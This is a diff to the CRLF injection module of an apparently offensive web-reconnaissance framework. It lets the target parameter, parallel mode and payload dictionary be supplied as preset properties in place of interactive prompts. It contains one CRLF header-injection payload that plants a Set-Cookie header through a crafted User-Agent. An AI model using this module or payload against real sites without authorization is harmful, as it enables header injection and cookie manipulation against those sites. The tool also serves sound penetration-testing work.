@@ -28,7 +28,7 @@ payloads = []
 
 info = "CRLF Injection module."
 searchinfo = "CRLF Injection module"
-properties = {}
+properties = {"PARAM":["Directory and Parameter to attack (eg /vuln/page.php?q=lmao)", " "], "PARALLEL":["Parallelise Attack? [1/0]", " "], "DICT":["Path to dictionary to be used in normal attacks (default: files/fuzz-db/crlf_payloads.lst)", " "]}
 
 def check0x00(headers, pay):
     success = []
@@ -82,8 +82,13 @@ def getFile0x00():
 
     try:
         print(GR+' [*] Importing filepath...')
-        print(O+' [#] Enter path to file (default: files/payload-db/crlf_payloads.lst)...')
-        w = input(O+' [#] Your input (Press Enter if default) :> ')
+        if properties["DICT"][1] == " ":
+            print(O+' [#] Enter path to file (default: files/payload-db/crlf_payloads.lst)...')
+            w = input(O+' [#] Your input (Press Enter if default) :> ')
+        elif properties["DICT"][1].lower() == "none":
+            w = ""
+        else:
+            w = properties["DICT"][1]
         if w == '':
             fi = 'files/payload-db/crlf_payloads.lst'
             print(GR+' [*] Importing payloads...')
@@ -151,12 +156,18 @@ def crlf(web):
     success = []
     success += check0x00(m, 'Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201%0d%0aSet-Cookie: Infected_by=Drake')
     print(GR+' [*] Initiating '+R+'Parameter Based Check...')
-    param = input(O+' [#] Scope parameter (eg. /vuln/page.php?crlf=x) :> ')
+    if properties["PARAM"][1] == " ":
+        param = input(O+' [#] Scope parameter (eg. /vuln/page.php?crlf=x) :> ')
+    else:
+        param = properties["PARAM"][1]
     if not param.startswith('/'):
         param = '/' + param
 
-    pa = input("\n [?] Parallelise Attack? (enter if not) :> ")
-    parallel = pa is not ""
+    if properties["PARALLEL"][1] == " ":
+        pa = input("\n [?] Parallelise Attack? (enter if not) :> ")
+        parallel = pa is not ""
+    else:
+        parallel = properties["PARALLEL"][1] == "1"
 
     e = getFile0x00()
     web0 = web + param
